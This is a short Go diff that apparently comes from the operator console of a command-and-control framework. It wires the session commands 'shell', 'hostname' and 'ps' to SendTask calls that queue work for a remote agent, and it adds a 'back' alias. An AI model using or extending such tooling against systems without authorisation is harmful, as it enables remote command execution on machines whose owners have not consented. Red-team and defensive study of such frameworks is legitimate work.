@@ -63,7 +63,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 	c.App.AddCommand(&grumble.Command{
 		Name:    "background",
 		Help:    "exit from session (does not kill session)",
-		Aliases: []string{"bg"},
+		Aliases: []string{"bg", "back"},
 		Run: func(c *grumble.Context) error {
 			DeleteAllCommands(c)
 			RegisterMainCommands(c.App)
@@ -79,8 +79,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 			a.String("cmd", "shell command to execute; commands with spaces need to be in quotes")
 		},
 		Run: func(c *grumble.Context) error {
-			c.App.Println(c.Args.String("cmd"))
-			return nil
+			return SendTask(agentid, "shell", c.Args.String("cmd"))
 		},
 	})
 
@@ -96,7 +95,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Name: "hostname",
 		Help: "get current hostname",
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "hostname", "")
 		},
 	})
 
@@ -155,7 +154,7 @@ func RegisterNewCommands(c *grumble.Context, agentid string) {
 		Name: "ps",
 		Help: "list running processes",
 		Run: func(c *grumble.Context) error {
-			return nil
+			return SendTask(agentid, "ps", "")
 		},
 	})
 
